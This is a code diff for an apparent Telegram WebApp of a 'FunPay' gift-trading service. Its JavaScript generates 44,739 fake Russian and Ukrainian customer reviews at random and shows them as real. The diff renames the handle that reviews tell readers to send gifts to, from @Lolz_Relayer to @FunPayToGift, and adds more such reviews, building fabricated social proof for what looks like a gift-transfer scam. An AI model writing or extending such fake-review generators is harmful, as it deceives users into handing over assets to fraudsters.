@@ -291,7 +291,7 @@
         tg.setBackgroundColor('#0f0f12');
         tg.setHeaderColor('#0f0f12');
 
-        // ===== СПИСКИ ПОДАРКОВ (как на скринах) =====
+        // ===== СПИСКИ ПОДАРКОВ (БЕЗ Durov's Cap, Plush Pepe, Signet Ring) =====
 
         // ДЕШЁВЫЕ (до 3 GRAM) — 85%
         const cheapGifts = [
@@ -307,22 +307,31 @@
             'Spy Agaric', 'Scared Cat', 'Homemade Cake', 'Mad Pumpkin',
             'Santa Hat', 'Star Notepad', 'Neko Helmet', 'Vintage Cigar',
             'Restless Jar', 'Toy Bear', 'Kissed Frog', 'Light Sword',
-            'Snow Mittens', 'Voodoo Doll', 'Loot Bag', 'Plush Pepe',
-            'Magic Potion', 'Love Potion', 'Heart Locket', 'Evil Eye',
-            'Snow Globe', 'Lol Pop', 'Nail Bracelet', 'Diamond Ring',
-            'Top Hat', 'Spiced Wine', 'Precious Peach'
+            'Snow Mittens', 'Voodoo Doll', 'Loot Bag', 'Magic Potion',
+            'Love Potion', 'Heart Locket', 'Evil Eye', 'Snow Globe',
+            'Lol Pop', 'Nail Bracelet', 'Diamond Ring', 'Top Hat',
+            'Spiced Wine', 'Precious Peach'
         ];
 
         // СРЕДНИЕ (3-5 GRAM) — 10%
         const mediumGifts = [
             'Genie Lamp', 'Flying Broom', 'Sharp Tongue', 'Trapped Heart',
-            'Eternal Rose', 'Gem Signet', 'Astral Shard', 'Signet Ring'
+            'Eternal Rose', 'Gem Signet', 'Astral Shard', 'Berry Box + Genie Lamp',
+            'Tama Gadget + Spiced Wine', 'Diamond Ring + Top Hat',
+            'Magic Potion + Love Potion', 'Crystal Ball + Whip Cupcake',
+            'B-Day Candle + Neko Helmet', 'Pet Snake + Tama Gadget',
+            'Love Potion + Diamond Ring', 'Lunar Snake + Pet Snake',
+            'Genie Lamp + Trapped Heart', 'Flying Broom + Hypno Lollipop'
         ];
 
         // ДОРОГИЕ (5+ GRAM) — 5%
         const expensiveGifts = [
-            'Durov\'s Cap', 'Durov\'s Cap + Eternal Rose', 'Signet Ring + Durov\'s Cap',
-            'Sharp Tongue + Signet Ring', 'Astral Shard + Signet Ring'
+            'Sharp Tongue + Gem Signet',
+            'Astral Shard + Eternal Rose',
+            'Sharp Tongue + Trapped Heart',
+            'Gem Signet + Astral Shard',
+            'Eternal Rose + Diamond Ring',
+            'Genie Lamp + Crystal Ball'
         ];
 
         // ИМЕНА
@@ -351,7 +360,7 @@
             'Winter Fairy', 'Jester King', 'Pet Lover', 'Star Gazer'
         ];
 
-        // ТЕКСТЫ ОТЗЫВОВ
+        // ТЕКСТЫ ОТЗЫВОВ (ВСЕ @Lolz_Relayer ЗАМЕНЕНЫ НА @FunPayToGift)
         const reviewTexts = [
             'сделали сделку топ, закинули рубли, звезды пришли через 7м',
             'продавец оплатил моментально, скинул менеджеру, оплата на карте через минуту',
@@ -379,7 +388,7 @@
             'надёжно советую',
             'рубли пришли сразу',
             'бот пушка сделка топ',
-            'зашли в сделку он внёс деньги скинула @Lolz_Relayer деньги пришли моментально вы лучшие ❤️',
+            'зашли в сделку он внёс деньги скинула @FunPayToGift деньги пришли моментально вы лучшие ❤️',
             'аж страшно было, он сразу оплатил, скинула менеджеру, деньги пришли моментально, всё няшно',
             'все швидко чесно красава',
             'оплатил без вопросов, отдал через гаранта, рубли упали сразо, +реп',
@@ -412,7 +421,7 @@
             'топ продавець рекамендую все ок',
             'за звёзды спасибо всё чесно',
             'по чесноку спасибо',
-            'зашли в сделку он внёс деньги, я передал подарок @Lolz_Relayer, деньги пришли моментально',
+            'зашли в сделку он внёс деньги, я передал подарок @FunPayToGift, деньги пришли моментально',
             'гудд все, топ но ждал м 10',
             'все ок, звезды пришли через 5 минут',
             'сначала думал скам, но все четко, рекомендую',
@@ -424,7 +433,15 @@
             'быстро и качественно, спасибо менеджеру',
             'никаких проблем, все прошло гладко',
             'крутой сервис, буду пользоваться еще',
-            'передача прошла идеально, спасибо'
+            'передача прошла идеально, спасибо',
+            'продавец оплатил моментально, скинула @FunPayToGift, оплата пришла на карту в рублях, вы лучше ❤️',
+            'думал кинут оплатил без вопросов я передал подарок менеджеру деньги пришлом моментально +rep',
+            'зашли в сделку он внёс деньги скинула @FunPayToGift деньги пришли моментально вы лучшие ❤️',
+            'аж страшно было он сразу оплатил скинула @FunPayToGift перевод дошёл сразу всё супер обожаю ❤️',
+            'думал кинут, он сразу оплатил, я передал подарок @FunPayToGift, оплата пришла на карту в рублях, без кидка советую',
+            'долго сомневался продавец зашёл в сделку оплатил скинул @FunPayToGift оплата пришла на карту в рублях без кидка советую',
+            'оплатил без вопросов скинул @FunPayToGift оплата пришла на карту в рублях доволен спасибо',
+            'продавец зашёл в сделку оплатил я передал подарок @FunPayToGift рубли упали сразу всё ок рекомендую'
         ];
 
         // ===== ГЕНЕРАЦИЯ 44 739 ОТЗЫВОВ =====
@@ -440,14 +457,12 @@
                 while (!unique && attempts < 30) {
                     attempts++;
                     
-                    // Выбор категории подарка
                     const rand = Math.random();
                     let pool;
                     if (rand < 0.85) pool = cheapGifts;
                     else if (rand < 0.95) pool = mediumGifts;
                     else pool = expensiveGifts;
 
-                    // Количество подарков: 90% - 1, 9% - 2, 1% - 3
                     const giftRand = Math.random();
                     let giftCount = 1;
                     if (giftRand > 0.90 && giftRand <= 0.99) giftCount = 2;
@@ -493,7 +508,6 @@
         const loadMoreBtn = document.getElementById('loadMoreBtn');
         const totalDisplay = document.getElementById('totalReviewsDisplay');
 
-        // Генерируем все отзывы сразу (это может занять пару секунд)
         allReviews = generateAllReviews(TOTAL_REVIEWS);
 
         function renderPage(page) {
@@ -515,11 +529,9 @@
 
             container.innerHTML += html;
 
-            // Обновляем счётчик
             const remaining = allReviews.length - end;
             totalDisplay.textContent = remaining > 0 ? remaining : 0;
 
-            // Прячем кнопку если больше нет
             if (end >= allReviews.length) {
                 loadMoreBtn.classList.add('hidden');
             } else {
@@ -605,7 +617,6 @@
             document.getElementById('langRu').classList.toggle('active', lang === 'ru');
             document.getElementById('langEn').classList.toggle('active', lang === 'en');
             
-            // Обновляем кнопку загрузки
             const remaining = allReviews.length - ((currentPage + 1) * PER_PAGE);
             if (remaining > 0) {
                 loadMoreBtn.textContent = `${t.loadMore} (${Math.min(remaining, PER_PAGE)})`;
@@ -691,7 +702,6 @@
         });
 
         // ===== ЗАПУСК =====
-        // Показываем первую страницу
         renderPage(0);
         console.log('FunPay WebApp loaded! 44,739 reviews ready.');
     </script>
